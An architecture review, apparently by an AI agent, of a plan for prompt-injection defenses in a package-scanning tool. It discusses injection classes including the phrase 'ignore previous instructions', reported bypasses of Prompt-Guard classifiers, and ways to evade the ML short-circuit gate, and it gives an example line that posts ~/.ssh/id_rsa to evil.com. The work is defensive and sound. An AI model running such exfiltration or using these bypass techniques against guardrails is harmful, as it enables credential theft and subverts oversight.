# Architect Review — ML + LLM Hybrid with Integrated IPI Defense

**Mode:** `/ralplan --consensus --deliberate`
**Reviewer:** oh-my-claudecode:architect (Opus 4.7, 1M ctx)
**Date:** 2026-04-22
**Plan:** `.omc/plans/ml-llm-hybrid-ipi-defense.md`
**Next:** Critic evaluation

---

## 1. Steelman antithesis — "Ship PR-1 + PR-2 + PR-3 only; defer ML + Dual-LLM indefinitely"

**The strongest case against the plan's architecture is not "skip ML" or "skip Dual-LLM" individually — it is: ship the three cheapest IPI layers (pattern catalog, spotlighting hardening, metadata-only reader) and stop there.** Here is why that delivers ~80% of the value for ~20% of the complexity:

**What PR-1 + PR-2 + PR-3 alone already give you:**

- The IPI pattern catalog (`src/aigate/ipi.py`) catches all trivial `"ignore previous instructions"` / tag-closure / ChatML / role-injection / obfuscation attacks at static-analysis time, before any LLM sees the input. This is the 80% — public IPI payloads almost uniformly use one of the ~30 patterns in the plan's catalog.
- Spotlighting hardening (random per-request nonce + datamarking + sandwich) closes the *only* delimiter-closure class that was specifically enabled by aigate's open-source fixed `<UNTRUSTED_PACKAGE_CODE>` tag (`src/aigate/backends/base.py:60-62`). After PR-2 this attack requires guessing a 16-hex-char secret, which is structurally infeasible.
- The metadata-only second reader (PR-3) provides the **reader-disagreement smoking gun** — the single highest-signal IPI detector in the plan. If full-code reader says SAFE and metadata-only reader (which by construction cannot have read the injection) says not-SAFE, route to `NEEDS_HUMAN_REVIEW`. This is empirically close to the Dual-LLM defense property.

**What PR-4 (Dual-LLM) adds that PR-3 doesn't:**

- Defense against acrostic/first-letter and long-context-buried attacks where the Quarantined LLM's structured schema output theoretically carries less attacker signal than the Privileged LLM's free-form reasoning.
- BUT: recent literature (Reversec Labs 2025, ConductorOne 2025) explicitly notes that **the Dual-LLM pattern secures only the *control flow*, not the *data flow*** — an attacker can still influence the **arguments** the Privileged LLM reasons over via attacker-controlled values inside the schema (the `observed_strings.top_domains` field, the `exec.subprocess_calls` field, etc. are all attacker-writable). A malicious package can encode semantic persuasion into schema-compliant values ("top_domains": ["official-microsoft-verified.com"]).
- DeepMind's CaMeL paper (April 2025) already showed Dual-LLM is a *stepping stone*, not a destination — the real solution is capability-tracked Python interpretation, not schema validation.

**What PR-5 (MetadataMLBackend) adds that PR-1+2+3 don't:**

- Latency improvement on the clear-SAFE majority via short-circuit.
- BUT: this is a cost/latency optimization, not a security improvement. And the short-circuit gate itself (Scenario 1 in the plan's pre-mortem) creates a **new attack surface** that the pure-IPI stack does not.
- The ML training pipeline adds ~2,500 LOC + sklearn/joblib + numpy + a pickled model file (joblib.gz) — a material supply-chain attack surface of its own (see §6 finding on NullifAI / PickleScan CVEs).

**The 80/20 case:** PR-1+2+3 ship in ~4.5 eng-days and close the four most-exploited IPI classes (direct override, tag-closure, role-injection, obfuscation) plus give reader-disagreement detection. PR-4 + PR-5 + PR-6 + PR-7 together are ~11.5 eng-days + 4-week promotion gate, and their marginal security gain over PR-3 is arguable while their marginal complexity gain is not. **"Ship IPI, delay ML and Dual-LLM" is the highest-EV alternative.**

**Why the plan is still (probably) right to reject this antithesis:** Driver 2 (LLM cost/latency is the CI/dev-install UX bottleneck) is real — 3-5s per `aigate check` breaks `pip install` and `npm install` workflows and pushes users to `--skip-ai`. ML short-circuit addresses that, and doing it in shadow mode first is the correct risk posture. The Dual-LLM is the weaker part of the plan (see §2, §4b, §4c) — the antithesis's force should land *there*, not on the whole architecture.

---

## 2. Real tradeoff tensions (5 concrete ones)

### Tension 1: Bundled model file as new supply-chain vector vs. offline-first principle

The plan ships `src/aigate/ml/models/metadata-ml-v1.joblib.gz` (300-700KB gzipped, ≤1MB target) inside the wheel. This is the right choice for Principle 1 (offline/airgapped). **But it creates a NEW attack surface: aigate is now a supply-chain security tool whose own wheel contains a pickled artifact.** The plan's Scenario 3 pre-mortem addresses poisoning-via-CI, but not the broader class documented in the search findings:

- ReversingLabs NullifAI (Feb 2025): attackers found multiple ways to hide pickle opcodes from scanners using "broken pickles" — HuggingFace's detection was bypassed.
- JFrog June 2025: three zero-day CVEs in `picklescan` (the most popular pickle scanner) allowed malicious model distribution.
- Sonatype 2025: four more CVEs in picklescan.
- CVE-2025-1716: picklescan bypass via malicious pickle.

**The tension is unresolved in the plan:** `joblib.load` is fundamentally `pickle.load` — if the bundled model file is ever replaced (supply-chain attack on aigate's own release pipeline, typosquat wheel on PyPI uploaded by a compromised maintainer, or compromised mirror), an `aigate check` execution is RCE. The plan's mitigations (SHA256 pin in source, two-person review, deterministic rebuild) are necessary but not sufficient — they protect against *aigate's CI* being compromised, not against *a user fetching aigate from a compromised mirror or registry*.

**Concrete request for revision:** the plan should either (a) use a non-pickle format (`skops.io` — which is explicitly pickle-free and sklearn-maintained — or ONNX via `skl2onnx`), or (b) add runtime verification that `joblib.load` is called on a file whose SHA256 matches the pinned constant **before** deserialization (currently the plan verifies *after* load, which is too late — RCE would have already fired). Option (a) is strictly better.

### Tension 2: Dual-LLM (PR-4) doubles LLM cost — but short-circuit (PR-5 Stage 2) requires the clear-SAFE majority to skip LLM entirely, gutting the Dual-LLM signal's coverage

The plan's cost model is inconsistent. On the residual 20-40% of traffic that is *not* short-circuited, PR-4 adds a second LLM call (Quarantined extraction), so total cost goes from 1× to 2× for that slice. The math only works if short-circuit is aggressive:

- If short-circuit fires on 70% of traffic: residual 30% × 2× LLM cost = 0.6× baseline → 40% cost saving.
- If short-circuit fires on 50% of traffic: residual 50% × 2× = 1.0× baseline → **zero savings**.
- If short-circuit fires on 30% of traffic: residual 70% × 2× = 1.4× baseline → **cost INCREASE**.

**The tension:** Stage 1 promotion gate requires agreement ≥ 95% *before* short-circuit fires. If agreement at Stage 1 is actually 90-94% (realistic for first-generation classifier), short-circuit never fires, and we've shipped a 1.4× LLM cost feature. The plan's 60% cost-saving assumption is unbacked.

**Concrete request for revision:** PR-4 acceptance criteria should include a decision gate — "if projected Dual-LLM-ON cost × residual-traffic-after-short-circuit > 1.2× baseline, Dual-LLM defaults OFF in config, even if the code ships." Currently the plan has `dual_llm.enabled: false` as default (good), but doesn't tie this to measured economics.

### Tension 3: Metadata-only reader (PR-3) as voting participant dilutes signal; as NEEDS_HUMAN_REVIEW-only inflates user-facing FP rate

The plan (per `.omc/research/ml-impl-3-ipi-defense.md` §"Disagreement-as-IPI-signal") routes to `NEEDS_HUMAN_REVIEW` when `full_code=SAFE ∧ metadata_only=SUSPICIOUS|MALICIOUS`. This is the right posture for detection, but it creates a hard tradeoff:

- **If metadata-only is a full voting participant** (weight ≥ 0.3): its baseline FP rate becomes the pipeline's floor. Metadata-only reader is, by construction, working with the same feature pattern that drives PR-5's ML model (typosquat + no_repo + has_install_scripts + low_downloads). It will fire "SUSPICIOUS" on any new, small, legitimate package by a new maintainer — that's a lot of noise. The weighted vote currently handles dissent by averaging confidence (`consensus.py:215`), which dilutes the IPI signal.
- **If metadata-only votes only via the disagreement rule** (plan's current posture): *every* package where full_code returns SAFE but metadata has any yellow flag becomes NEEDS_HUMAN_REVIEW. For a new-but-legitimate package (say, a project's second release), this trips the review gate on packages that have no actual IPI. Realistic user-facing FP rate: 5-15% of low-reputation-but-legitimate packages route to review. This is the `CHANGELOG.md` phrase issue but worse.

**Concrete request for revision:** the disagreement rule needs a **confidence-weighted threshold**, not a boolean. E.g. `if full_code=SAFE AND metadata_only.verdict != SAFE AND metadata_only.confidence >= 0.7 AND (full_code.confidence - metadata_only.confidence) < 0.3 → NEEDS_HUMAN_REVIEW; else emit signal but keep full_code verdict`. The research doc (§metadata-only second reader) already suggests confidence ≥ 0.6; the plan should raise this to 0.7 and add the gap constraint to reduce FPR.

### Tension 4: Temporal split (right) + OSSF npm Q3-Q4 2025 bulk ingest (adversarial) creates evaluation ambiguity

The plan correctly uses temporal split (Driver 3). It correctly identifies the npm 2025-Q3/Q4 ingest spike as needing to be excluded from training. **But it does not resolve what to do with that spike at evaluation time.** If `test_published_at > 2024-07-01` includes the 2025-11 142,163-package ingest, then "PR-AUC ≥ 0.95 on temporal test" is measured against a test distribution overwhelmingly dominated by a *single campaign / bulk-discovery event*. The model could achieve 0.95 by learning that campaign's fingerprint and be completely useless on actual 2026 traffic.

**Concrete request for revision:** the plan should specify *two* temporal test sets:
- `temporal_test_stable`: 2024-07 to 2025-06 — the baseline against which thresholds are tuned.
- `temporal_test_adversarial`: 2025-07 onwards — reported separately, **not** used for promotion gating, only for diagnostics.

Currently the plan conflates these via `test_published_at > 2024-07`.

### Tension 5: `aigate check` is sometimes a low-latency blocking gate (CI, `pre-install` hook) and sometimes an interactive query — a single short_circuit threshold can't serve both

The plan's `ml.short_circuit_confidence_threshold: 0.95` is one number. But:

- In a CI pipeline scanning 100 packages, a 3-5s LLM call per package adds 5-8 minutes. Users want short-circuit aggressive.
- At `pip install requests` on a dev laptop, the user waits for one check. Getting it wrong (approving malicious) is catastrophic. Users want short-circuit conservative.

The plan doesn't expose a context-aware threshold. Sensible defaults would differ per context.

**Concrete request for revision:** add `ml.short_circuit_confidence_threshold_ci: 0.90` and `ml.short_circuit_confidence_threshold_interactive: 0.97` (or a single `short_circuit_mode: strict|balanced|aggressive` preset). Detect CI via `CI=true` / `GITHUB_ACTIONS` env (same detection `telemetry.auto_disable_in_ci` already uses).

---

## 3. Principle violations (deliberate-mode scrutiny)

**Principle 1 — Local-first + offline-capable.**
- PR-6's kill-switch remote-list fetch (`https://aigate.dev/kill.json`, refresh ≤24h) is an inbound network dependency that is **conditionally** violated: the plan says "remote is optional, local circuit-breaker still works offline." Acceptable IF the code defaults to `remote_list_url: null` or handles fetch failure silently. The config stanza at `.aigate.yml → ml.kill_switch.remote_list_url: https://aigate.dev/kill.json` is **set by default** and the plan's open-question #3 acknowledges "aigate.dev domain assumes infra we may not have." **FLAG: MEDIUM** — the default config violates Principle 1 unless the fetch is best-effort with timeout-to-no-op. Recommend default to `null` (no remote), opt-in to remote list.
- PR-4's `dual_llm.quarantined_backend: auto` falling back to Gemini Flash requires network; if Ollama is not locally available this is a silent offline-mode violation. **FLAG: LOW** (user opts in to Dual-LLM; research doc §Dual-LLM already notes "fast backend (e.g. local Ollama)").

**Principle 2 — Everything toggleable, nothing mandatory.**
- `pydantic>=2.6` becomes a required dep (not optional) per PR-4. The plan justifies this ("ConsensusResult already needs validation") but `ConsensusResult` (`src/aigate/models.py:127`) is a plain `@dataclass` with no pydantic usage today. **FLAG: LOW** — the justification is thin; adding a required runtime dep for an optional feature (Dual-LLM) is a Principle-2 tension. Alternative: `pydantic` moves to `[project.optional-dependencies].ipi = [...]` gated behind `ipi_defense.dual_llm.enabled`, schema validation falls back to `json.loads` + manual dict validation when pydantic is missing.
- PR-5's `sklearn` is correctly optional. Good.

**Principle 3 — Flexibility by composition, not special-case flags.**
- The `ml.mode: short_circuit_safe` enum collapses two orthogonal decisions (ML participates in vote AND ML can skip LLM on SAFE) into one mode. The plan's own toggle matrix at L356-369 shows this creates ambiguity for `short_circuit_safe` with LLMs off: "same" behavior as `vote` with single voter. **FLAG: LOW** — a cleaner design would be `ml.vote_weight: float` + `ml.short_circuit.enabled: bool` + `ml.short_circuit.min_confidence: float`, yielding the same 4 combinations without a mode enum. The plan's current enum is a Principle-3 violation of its own declared "composition, not special-case flags" rule.

**Principle 4 — Evidence gates promotion.**
- No violation. The 3-stage gate with explicit thresholds (≥95% agreement, ≥50K samples, ≥4 weeks, PR-AUC ≥0.95, Brier ≤0.05, retroactive precision ≥0.9) is well-specified and aligned.

**Principle 5 — Trust nothing the package author wrote.**
- No violation in the IPI stack. Minor note: PR-3's metadata-only reader consumes `description` from registry JSON (`PackageInfo.description` at `models.py:64`) — registry descriptions *are* author-controlled (PyPI/npm do not sanitize). The plan treats "registry-sourced strings" as trusted in PR-3 but they are not. **FLAG: LOW** — recommend extending PR-1's `scan_for_ipi` to also scan `PackageInfo.description` / `PackageInfo.author` strings and emit signals before they reach the metadata-only reader's prompt.

**Summary: no CRITICAL or HIGH principle violations; 2 MEDIUM-or-lower flags** (remote-kill-switch default, pydantic-required) that should be addressed before Critic review.

---

## 4. Direct answers to Planner's 4 scrutiny asks

### (a) Short-circuit safety gate `prefilter==NONE ∧ ML.conf≥0.95 ∧ mode=short_circuit_safe` — bypass paths

**Bypass paths exist. Three concrete classes.**

**Class A — Maintainer-takeover of an established popular package** (the plan's Scenario 1 only partially addresses this).

Consider `lodash@4.17.25` (hypothetical). The maintainer account is compromised via a stolen npm token; attacker publishes a minor version with a malicious `postinstall` that is structurally benign-looking to regex but does exfil. What the short-circuit gate sees:

- `prefilter.risk_level`: Will NOT be `NONE` if `has_install_scripts` is true — `prefilter.py:434-436` emits `"has_install_scripts: package has install-time scripts"`. But that's a MEDIUM-count signal (`_calculate_risk_level` at L875-893 needs `medium_count >= 3 OR escalating >= 4`). A clean-looking postinstall + legitimate-looking description + existing repo = **only 1 MEDIUM signal** → `RiskLevel.LOW` → NOT `NONE`. Gate blocked. Good.
- **BUT**: `lodash`-class packages that do *not* have install scripts (e.g. pure Python libraries) would trip the gate. If the attack is import-time via `__init__.py` — NullifAI-style malicious pickle in a ML-helper library, or a shadowed module — then: no install scripts, established repo, 74 maintainers, 40M weekly downloads, low typosquat distance, feature vector is *indistinguishable* from benign top-decile. ML returns `prob_malicious = 0.02` (conf = 0.98 SAFE). Gate fires. **LLM is skipped. Exfil runs at import.**

**Mitigation recommendation**: gate must also require `external_intelligence` shows stable maintainer-set for the preceding N months. Currently the plan has no "recent maintainer churn" signal — `PackageInfo` at `models.py:60-72` has no `maintainers_history` field. **Concrete fix**: add `maintainer_set_changed_within_30d` as Feature #49 to the ML input (monotonic +1, source: registry API history). If this feature is present and true, short-circuit is blocked regardless of ML confidence.

**Class B — Adversarial feature crafting.**

Attacker knows the 48 features. Plan says `monotonic_cst` helps — but only for monotonic features. The ~18 features with `mono=0` (entropy, file counts, release interval, size ratio, `name_shannon_entropy`, `keywords_count`) are not monotonicity-protected. Attacker engineers the package to match benign-median on those features. **This is the standard adversarial-ML evasion playbook.** The plan acknowledges this in Scenario 1 but mitigates via "kill switch 1.5× baseline" — which is a *detection*, not a *prevention*, and only fires *after* users are infected.

**Mitigation recommendation**: the short-circuit gate should have a **hard "no short-circuit on packages younger than 14 days with fewer than 5 prior versions"** rule. Plan's `pkg_age_days` is mono=-1 (good for scoring) but mono doesn't *block* short-circuit — the gate uses ML output, not individual features. Add: `ml.short_circuit.hard_gates: {min_pkg_age_days: 14, min_num_releases: 5}`. These are the cheapest adversarial-robustness hard gates possible.

**Class C — Prefilter-miss on IPI-free attacks.**

The plan's gate depends on `prefilter.risk_level == NONE`. But a package that does `import requests; requests.post("http://evil.com/x", data=open("~/.ssh/id_rsa").read())` at import-time in a deeply-nested module file may not trip any current prefilter rule (no obfuscation, no base64, no eval, no install script — just plain Python). The current `check_dangerous_patterns` (`prefilter.py:440-546`) is rule-based; a clean-coded exfil misses. ML has a fighting chance (`num_files_total` + `readme_length_bytes` + `has_repository_url` might disagree) but the gate short-circuits on the ML-SAFE output without LLM.

**Mitigation recommendation**: the gate should require `prefilter.risk_level == NONE` **AND** at least one of `package.repository` or `package.homepage` resolves to a real git host **AND** `package.download_count > threshold` (configurable, suggested 100/day). This is a "trust-base" requirement, not a signal-absence requirement.

### (b) PR-4 schema-violation fallback — `metadata_only_only` vs `route_needs_human_review`

**Recommend `metadata_only_only` + add a rate-limit-trip to `route_needs_human_review`.**

Analysis:

| Fallback | Safety | Cost | Debuggability |
|---|---|---|---|
| `metadata_only_only` | Medium-High. Metadata-only reader cannot see raw source, so IPI has no purchase. But *signal quality* for non-IPI malicious packages is degraded — metadata can miss code-only threats. | Low. No extra LLM call. | High. One branch to exercise. |
| `route_needs_human_review` | Highest. Humans catch what schema-failure hid. | High user-facing FP. A Claude model update that adds one extra schema field triggers 100% NEEDS_HUMAN_REVIEW for 24-72h until a fix ships. **User-facing outage.** | Medium. Harder to distinguish "transient LLM flakiness" from "persistent IPI under cover of schema drift." |
| `disable_layer` | Lowest. Silently re-enables full-code-privileged-reads-raw — the attack surface Dual-LLM was meant to close. Pre-mortem Scenario 2 warns against exactly this. | Lowest. | Worst — silent downgrade. |

**Recommendation:** default to `metadata_only_only`, but add an automatic escalation — if `quarantined_llm_schema_violation` rate exceeds 5% over 1000 calls, auto-switch to `route_needs_human_review` until schema success recovers. This is exactly what the plan's Scenario-2 mitigation (e) ("weekly `aigate doctor --ipi-stats` fails CI if schema-violation rate > 2%") implies but doesn't wire into runtime behavior. The plan has the alarm, not the action.

**Concrete fix**: add `ipi_defense.dual_llm.on_schema_violation: metadata_only_only` as plan currently has, but add a SECOND key `ipi_defense.dual_llm.schema_violation_escalation_threshold: 0.05` that, once tripped over the last 1000 calls, flips to `route_needs_human_review` automatically. Expose in `aigate doctor --ipi-stats`.

### (c) PR-5 ordering — strictly after PR-4, or parallelize behind shadow?

**Parallelize.** The plan's sequencing rationale (L264-281) actually already says this: "PR-5 parallelizable with PR-2/3/4." But then the risks/totals section (L262) counts 16 eng-days as if serial, and the PR-5 dependencies field says "none (can parallelize with PR-2/3/4 because it lands under `ml.mode=shadow` default, which is no-op on verdicts)". So the plan internally agrees — I'm confirming.

**Concrete justification:**

- PR-5 touches `consensus.py` to register `metadata-ml` in `BACKEND_MAP` and add shadow-mode weight-zero logic. PR-3 touches `consensus.py` to add `_detect_reader_disagreement`. PR-4 touches `consensus.py` to add the Quarantined pre-stage. These are **three separate code regions** in the same file — minor merge conflict risk, nothing structural.
- PR-5's shadow-mode invariant (`ConsensusResult.final_verdict` bit-for-bit unchanged when `ml.mode=shadow`) makes it safe to land before PR-3/4 stabilize.
- The 4-week shadow-evidence gate is the real critical path. PR-5 landing on week 0 vs week 3 changes when shadow starts, which changes when Stage-1 promotion unlocks.

**Recommendation: land PR-5 in a separate lane right after PR-1** (PR-1 gives `IPI` utilities only if needed; PR-5 does not *require* them for shadow). This compresses the calendar from 10 days to 7-8 calendar-days and starts the 4-week shadow clock earlier. The PR-5 → PR-6 dependency (kill-switch reads shadow log) is honored naturally.

### (d) Kill-switch multipliers 1.5× (short-circuit) vs 3.0× (general) — are these the right numbers?

**1.5× is defensible. 3.0× is too loose. Derive from Poisson-bound principles:**

The base rate of malicious packages in production traffic is ~0.1-1% (plan's Driver 3 cites MeMPtec/MalGuard). Assume actual short-circuit-bucket base rate is ~0.005% (ML requires conf ≥0.95 on clear-prefilter — most malicious filtered out upstream). With 1000 short-circuited events in a sliding hour, expected malicious = 0.05. If we observe 1 confirmed FN retroactively, that's 20× baseline — far past 1.5× — so 1.5× is *very* tight (fires often from small-N noise). **BUT**: that is the right design intent — short-circuit is the highest-impact path (LLM skipped), so false *negative* costs dominate, and a "fires too often" kill-switch that degrades gracefully to shadow mode is fine.

For general ML-contributing traffic (ML voting participant but LLM also runs), the base rate mismatch multiplier needs to account for:
- Much larger denominator (all traffic, not just short-circuit).
- LLM is still running as backstop — an ML FN is caught by LLM disagreement in most cases.
- False trips of the kill-switch remove ML's cost-saving contribution without security benefit.

**Problem with 3.0×:** if baseline disagreement-malicious rate is ~0.2% (ML says SAFE, LLM says MALICIOUS post-verification), 3× requires observed rate of 0.6% — that's **60 events per 10,000** before tripping. For a 10K-event daily cohort with 1% retroactive-confirmation lag, by the time kill-switch trips, up to ~60 FNs have been in the wild for ~24h. That is too slow.

**Concrete recommendation:**

- Short-circuit: **keep 1.5×**, add **absolute floor** of 5 confirmed FNs in any 24h regardless of multiplier (so small-N baseline noise doesn't mask a real campaign). Current plan has only the multiplier; add absolute trigger.
- General ML-contributing: **tighten to 2.0×** (not 3.0×) with absolute floor of 10 FNs / 24h. Industry precedent: Datadog AI Guard's "monitor-only → enforce" escalation uses ~2× as the warning threshold, not 3×. (Source: plan's external-verification log already references Datadog AI Guard 2026 preview as monitor-only-first.)
- Add a **latency kill-switch**: plan has "p95 > 500ms for 15 consecutive min." This is right; don't change.

**Derivation from first principles**: 1.5× ~ 1 + 2×σ for Poisson with λ≈0.5 (strict fire on small lift), 3.0× ~ 1 + 4×σ (very lax). For security tools the default bias should be toward false-alarm over missed-detection; 2.0× is the industry sweet-spot.

---

## 5. Synthesis — proposed plan revisions

Where the plan and antithesis conflict, preserve the plan's overall sequencing (antithesis is not strong enough to kill PR-4/PR-5/PR-6/PR-7) but adopt these eight concrete revisions:

1. **Replace `joblib.gz` bundle format with `skops.io`** (or ONNX via `skl2onnx`) to eliminate the pickle-RCE supply-chain class. (§2 Tension 1, §6 findings #4 and #5.) If skops is not yet viable for `HistGradientBoostingClassifier` + `CalibratedClassifierCV`, the fallback is `joblib` + **pre-deserialization SHA256 verification** (read bytes, verify SHA256, then `joblib.load` from `io.BytesIO`) instead of post-load verification. Update PR-5 acceptance criteria.

2. **Default `ipi_defense.dual_llm.enabled: false`** (already in plan — keep) AND gate enabling it behind a measured-cost check: if projected post-short-circuit residual LLM cost multiplier >1.2× baseline, `aigate doctor --ipi-stats` warns that Dual-LLM is a net cost regression. (§2 Tension 2.)

3. **Tighten the metadata-only-reader disagreement rule** from `metadata_only.verdict != SAFE` to `metadata_only.verdict != SAFE AND metadata_only.confidence >= 0.7 AND gap(full_code.conf, metadata_only.conf) < 0.3`. Emits signal in other cases but does NOT route to NEEDS_HUMAN_REVIEW. (§2 Tension 3.)

4. **Split temporal test set into `_stable` (pre-2025-07) and `_adversarial` (post-2025-07)**. Stage-1 promotion uses `_stable` only; `_adversarial` is reported as a separate diagnostic. (§2 Tension 4.)

5. **Add context-aware short-circuit thresholds**: `ml.short_circuit_confidence_threshold_ci` vs `_interactive`. Auto-detect CI. (§2 Tension 5.)

6. **Add hard gates for short-circuit bypass prevention**: `ml.short_circuit.hard_gates: {min_pkg_age_days: 14, min_num_releases: 5, maintainer_set_changed_within_30d: must_be_false}`. These bypass the ML-confidence check for packages that structurally cannot have been battle-tested. (§4a Class A + B.)

7. **Make remote kill-switch opt-in, not default-on**: change `.aigate.yml → ml.kill_switch.remote_list_url` default from `https://aigate.dev/kill.json` to `null`. Users opt in. Preserves Principle 1. (§3 Principle 1 flag.)

8. **Dual-LLM schema-violation escalation**: add `ipi_defense.dual_llm.schema_violation_escalation_threshold: 0.05` — auto-flip to `route_needs_human_review` when schema-failure rate exceeds 5% over last 1000 calls. (§4b.)

9. **Tighten kill-switch multipliers**: short-circuit 1.5× keep + add absolute-FN floor of 5/24h; general 3.0× → **2.0×** + absolute-FN floor of 10/24h. (§4d.)

10. **Scan `PackageInfo.description` + `PackageInfo.author` via `scan_for_ipi`** in PR-1 — registry strings are author-controlled, not trusted. (§3 Principle 5 flag.)

11. **Parallelize PR-5 with PR-2/3/4 (confirm existing plan rationale, fix eng-days arithmetic)**: 16 eng-days serial → ~10 eng-days with 2 lanes → ~7-8 calendar-days with 3 lanes. The 4-week shadow clock is the real critical path. (§4c.)

12. **Move `pydantic` to `[project.optional-dependencies].ipi = [...]`** if PR-4's Dual-LLM is the only required-pydantic user. Preserves Principle 2. Fallback: manual dict validation when pydantic absent. (§3 Principle 2 flag.)

---

## 6. External web checks (2026-04-22)

### Check 1: Llama Prompt-Guard-2 drop-in? Bypass reports?

**URL/Date:** [Bypassing Meta's LLaMA Classifier: A Simple Jailbreak](https://blogs.cisco.com/security/bypassing-metas-llama-classifier-a-simple-jailbreak) (Feb 2025); [arXiv:2504.11168 "Bypassing Prompt Injection and Jailbreak Detection in LLM Guardrails"](https://arxiv.org/html/2504.11168v1) (April 2025); [Trendyol Tech bypass case study](https://medium.com/trendyol-tech/bypassing-metas-llama-firewall-a-case-study-in-prompt-injection-vulnerabilities-fb552b93412b) (2025); [Llama Prompt Guard 2 model cards](https://www.llama.com/docs/model-cards-and-prompt-formats/prompt-guard/).

**Takeaway:** The *original* Prompt-Guard-86M was bypassed with 99.8% success rate (Feb 2025 Cisco/Robust Intelligence) via simple character-spacing and punctuation-stripping. Prompt-Guard-**2** (86M and 22M variants) was trained with "optimized energy-based loss" and an explicit tokenization fix to counter adversarial tokenization — a DIRECT response to the v1 bypass. **However, May 2025 reports document bypasses of v2** via multilingual inputs, zero-width chars, emoji/Unicode tags, and character smuggling. **Implication for plan:** Prompt-Guard-2 is NOT a drop-in; even v2 is bypass-prone. The plan's `ipi_defense.classifier.as_signal_only: true` posture is correct — never use as sole gate. **Recommend adding note to plan: "v2 remains bypass-susceptible; classifier is a stacked signal only, never a gate. Score threshold 0.8 is acknowledged-noisy."**

### Check 2: Aikido Intel AGPL — compatible with aigate (Apache-2.0) consumption?

**URL/Date:** [Aikido Intel malware page](https://intel.aikido.dev/malware) (live 2026-04-22); [Aikido blog launch post](https://www.aikido.dev/blog/launching-aikido-malware---open-source-threat-feed); [AikidoSec/safe-chain GitHub](https://github.com/AikidoSec/safe-chain).

**Takeaway:** Aikido Intel feed is AGPL; 750 vulns + 5,800 malware threats actively maintained. Public endpoints confirmed:
- `https://intel.aikido.dev/malware` (web UI)
- `safe-chain` reference implementation provides the consumption pattern.

AGPL copyleft triggers only on **network distribution of a modified version** of AGPL-licensed *software*. A *data feed* consumed via HTTPS (aigate fetches JSON, uses the data, does not redistribute the Aikido software) is **compatible** with Apache-2.0 aigate — the standard interpretation of AGPL treats consuming AGPL data the same as consuming any API. The plan's open-question #4 ("consume as input only, don't redistribute") is the right posture. **Action: confirm plan's Option 4 — consume as input, don't redistribute, don't bundle Aikido code.**

### Check 3: Dual-LLM pattern 2025/2026 refinements — is "Privileged LLM sees only schema" under attack?

**URL/Date:** [Simon Willison "Design Patterns for Securing LLM Agents"](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/) (June 2025); [DeepMind CaMeL paper via InfoQ](https://www.infoq.com/news/2025/04/deepmind-camel-promt-injection/) (April 2025); [ConductorOne "Splitting AI Agents"](https://www.conductorone.com/engineering/splitting-ai-agents-to-contain-prompt-injection/); [Reversec Labs "Design Patterns to Secure LLM Agents In Action"](https://labs.reversec.com/posts/2025/08/design-patterns-to-secure-llm-agents-in-action) (Aug 2025).

**Takeaway:** Dual-LLM is **increasingly recognized as necessary but insufficient** in 2025 literature. Reversec 2025: *"The Dual LLM secures only the control flow which is handled by the Privileged LLM. The data flow is influenced by the Quarantined LLM without any restrictions. This means that an attacker cannot influence what actions will be taken and which tools will be used, but they can impact the arguments used in those actions and tools."* DeepMind's CaMeL (April 2025) supersedes it via capability-tracked Python interpretation — but CaMeL is too heavyweight for aigate. **Implication for plan:** Dual-LLM gives roughly the same protection in aigate's use case as PR-3's metadata-only reader, at 2× the cost. The plan's choice to default `dual_llm.enabled: false` is correct. **Recommend plan acknowledge this explicitly in ADR: "Dual-LLM is a latent capability for future enablement; PR-3's metadata-only reader carries 80% of the same protection at 50% of the cost." Antithesis §1 lands here.**

### Check 4: Model-file-as-attack-vector — 2024-2026 incidents

**URL/Date:** [ReversingLabs NullifAI retrospective via ReversingLabs blog](https://www.reversinglabs.com/blog/sscs-report-2025-retrospective) (2025); [JFrog PickleScan 3 zero-days](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (June 2025); [CVE-2025-1716 PickleScan bypass](https://github.com/advisories/GHSA-655q-fx9r-782v); [Palo Alto Unit 42 "RCE in AI Python libraries"](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/); [arXiv:2508.19774 "The Art of Hide and Seek"](https://arxiv.org/html/2508.19774v1) (Aug 2025); [CVE-2025-23304 NVIDIA NeMo pickle deserialization](https://security.snyk.io/vuln/SNYK-PYTHON-PICKLESCAN-12177842).

**Takeaway:** **2025 is the year pickle-based ML model distribution became a recognized supply-chain attack class.** NullifAI (Feb 2025) shipped malicious HF models bypassing HF's own picklescan. June 2025: three zero-day CVEs in picklescan itself. August 2025 arXiv paper confirms "stealthy pickle poisoning" is an active research area. NVIDIA NeMo shipped a pickle-RCE CVE in 2025. **Critical implication for plan:** PR-5 ships `metadata-ml-v1.joblib.gz` = a pickled artifact. If aigate ever becomes popular enough to be a typosquat target, a hostile PyPI mirror, or a compromised CI could ship a poisoned joblib that executes on every `aigate check`. **This is the single highest-severity finding in this review.** The plan's Scenario 3 addresses CI-side risk but not client-side fetch risk. **Revision 1 in §5 (skops or pre-load SHA256 verify) is mandatory, not optional.**

### Check 5: monotonic_cst — does it trade recall too much for security?

**URL/Date:** [sklearn HistGradientBoostingClassifier 1.8.0 docs](https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.HistGradientBoostingClassifier.html); [sklearn monotonic-constraints example](https://scikit-learn.org/stable/auto_examples/ensemble/plot_monotonic_constraints.html); [sklearn PR #28925 monotonic_cst + categorical interaction fix](https://github.com/scikit-learn/scikit-learn/pull/28925) (2024).

**Takeaway:** No published critique of monotonic_cst for security ML specifically — but the general ML literature (Incer et al. 2018, which the plan cites) is clear that monotonic constraints trade some PR-AUC for adversarial robustness. Typical empirical cost: **0.5-3 PR-AUC points** for +2-5 points of attacker-effort inflation. For aigate this is correct: we'd rather lose 1 pt PR-AUC on random split than have an attacker lower one feature to flip verdict. **No fresh critique found. Plan's choice stands; just verify in training that test-set PR-AUC with monotonic = 0.95+ holds (plan's Stage-1 gate already requires this).**

**Additional note from search:** sklearn 1.8 has a specific fix (PR #28925) for a ValueError when combining `monotonic_cst` with `categorical_features` on older versions. Plan's CI matrix pin of sklearn ≥1.4 is safe if no categorical features are declared; if PR-5 adds categorical_features later, it must bump to ≥1.8.

---

## 7. Architect verdict

**`REVISE-BEFORE-CRITIC`** — the plan is architecturally sound in its sequencing and overall strategy, but has one CRITICAL, two HIGH, and several MEDIUM issues that should be addressed before Critic evaluation so Critic spends cycles on the right tradeoffs, not on issues already known to have concrete fixes.

**One-paragraph handoff for Critic:**

